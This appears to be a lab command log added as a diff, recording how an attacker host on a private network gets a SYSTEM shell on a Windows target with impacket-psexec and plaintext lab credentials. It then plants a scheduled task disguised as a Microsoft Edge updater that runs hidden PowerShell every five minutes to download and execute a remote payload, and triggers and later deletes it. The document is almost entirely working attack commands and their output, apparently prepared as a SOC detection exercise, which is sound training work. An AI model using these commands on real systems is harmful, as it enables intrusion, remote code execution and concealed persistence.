@@ -1,0 +1,24 @@
+# Kali commands — SOC-Case-Scheduled-Task (192.168.100.106 -> 192.168.100.108)
+# Actual commands run.
+
+# Foothold: SYSTEM shell
+impacket-psexec adminlab:'P@ssw0rd'@192.168.100.108
+#   v0.14.0 — ADMIN$ upload TVMxBfgf.exe, service rPEs -> C:\Windows\system32>
+
+# --- inside psexec shell ---
+
+# Create masqueraded hidden persistent task (runs IEX payload every 5 min as SYSTEM)
+schtasks /create /tn "MicrosoftEdgeUpdateTask" /tr "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.106/payload.ps1')\"" /sc minute /mo 5 /ru SYSTEM /f
+#   SUCCESS: The scheduled task "MicrosoftEdgeUpdateTask" has successfully been created.
+
+# Verify
+schtasks /query /tn "MicrosoftEdgeUpdateTask" /v /fo list | findstr /i "TaskName TaskToRun RunAs State Schedule Next"
+#   Enabled, Run As User: SYSTEM, Schedule Type: Minute
+
+# Trigger manually (payload fires)
+schtasks /run /tn "MicrosoftEdgeUpdateTask"
+#   SUCCESS: Attempted to run the scheduled task.
+
+# Cleanup (lab)
+schtasks /delete /tn "MicrosoftEdgeUpdateTask" /f
+#   SUCCESS: deleted.
